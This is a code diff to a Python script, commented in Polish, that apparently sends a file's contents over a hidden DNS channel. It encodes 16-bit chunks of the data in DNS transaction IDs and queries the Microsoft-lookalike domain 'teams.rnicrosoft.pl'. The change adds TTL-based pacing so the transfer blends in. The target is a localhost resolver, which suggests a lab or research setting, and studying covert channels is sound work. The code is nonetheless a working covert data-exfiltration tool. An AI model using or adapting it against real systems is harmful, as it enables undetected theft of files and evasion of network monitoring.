@@ -1,7 +1,11 @@
 import socket
 import random
+import time
 from IO_ops import *
 from dnslib import DNSRecord, DNSHeader, DNSQuestion, QTYPE
+
+
+SPECIAL_CHAR = 0x0000
 
 
 def mix_two_chars_bits(chunk):
@@ -19,6 +23,12 @@ def modify_txid_based_on_last_bits(chunk):
     else:
         return 850
 
+def dns_query(txid, domain):
+    return DNSRecord(
+        DNSHeader(id=int(txid)),
+        q=DNSQuestion(str(domain), QTYPE.A)
+    )
+
 def send_dns_query(filepath):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     client.settimeout(2)
@@ -31,15 +41,9 @@ def send_dns_query(filepath):
     binary_list = text_to_binary_list(text)
     binary_data = ''.join(binary for _, binary in binary_list)
 
-    special_char = 0x0000
-
     # Start przesylania ukrytej wiadomosci
-    end_query = DNSRecord(
-        DNSHeader(id=special_char + 1500),
-        q=DNSQuestion("teams.rnicrosoft.pl", QTYPE.A)
-    )
-    client.sendto(end_query.pack(), ('127.0.0.1', 5353))
-    print(f"Sent START TXID: {special_char} + 1500")
+    client.sendto(dns_query(SPECIAL_CHAR + 1500, "teams.rnicrosoft.pl").pack(), ('127.0.0.1', 5353))
+    print(f"Sent START TXID: {SPECIAL_CHAR} + 1500")
 
     try:
         response, _ = client.recvfrom(512)
@@ -47,32 +51,32 @@ def send_dns_query(filepath):
     except socket.timeout:
         print("No response received (timeout)")
 
-    # Wlasciwe dane
+    # Ukryte dane
     for i in range(0, len(binary_data), 16):
         chunk = binary_data[i:i+16]
         if len(chunk) < 16:
             chunk = chunk.ljust(16, '0')  # Dopelnij zerami do 16 bitów
         
         chunk = mix_two_chars_bits(chunk)
-        number_to_add = modify_txid_based_on_last_bits(chunk)
-        txid = int(chunk, 2)  # Konwersja bitów na int
+        txid = int(chunk, 2) + int(modify_txid_based_on_last_bits(chunk)) # Konwersja bitów na int
         
-        # DNS query
-        query = DNSRecord(
-            DNSHeader(id=txid),
-            q=DNSQuestion("teams.rnicrosoft.pl", QTYPE.A)
-        )
-        
-        client.sendto(query.pack(), ('127.0.0.1', 5353))
+        client.sendto(dns_query(txid, "teams.rnicrosoft.pl").pack(), ('127.0.0.1', 5353))
         print(f"Sent TXID: {txid} (chunk: {chunk})")
 
+        # Odbierz odpowiedz TTL i czekaj az minie TTL
+        try:
+            response, _ = client.recvfrom(512)
+            dns_response = DNSRecord.parse(response)
+            ttl = dns_response.rr[0].ttl if dns_response.rr else 1  # jeśli nie ma rr, domyśl TTL = 1s
+            print(f"Received response, sleeping for {ttl} seconds")
+            time.sleep(ttl)
+        except socket.timeout:
+            print("No response received (timeout), sleeping for 1 second")
+            time.sleep(1)
+
     # Koniec przesylania ukrytej wiadomosci
-    end_query = DNSRecord(
-        DNSHeader(id=special_char + 1500),
-        q=DNSQuestion("teams.rnicrosoft.pl", QTYPE.A)
-    )
-    client.sendto(end_query.pack(), ('127.0.0.1', 5353))
-    print(f"Sent END TXID: {special_char} + 1500")
+    client.sendto(dns_query(SPECIAL_CHAR + 1500, "teams.rnicrosoft.pl").pack(), ('127.0.0.1', 5353))
+    print(f"Sent END TXID: {SPECIAL_CHAR} + 1500")
 
     try:
         response, _ = client.recvfrom(512)
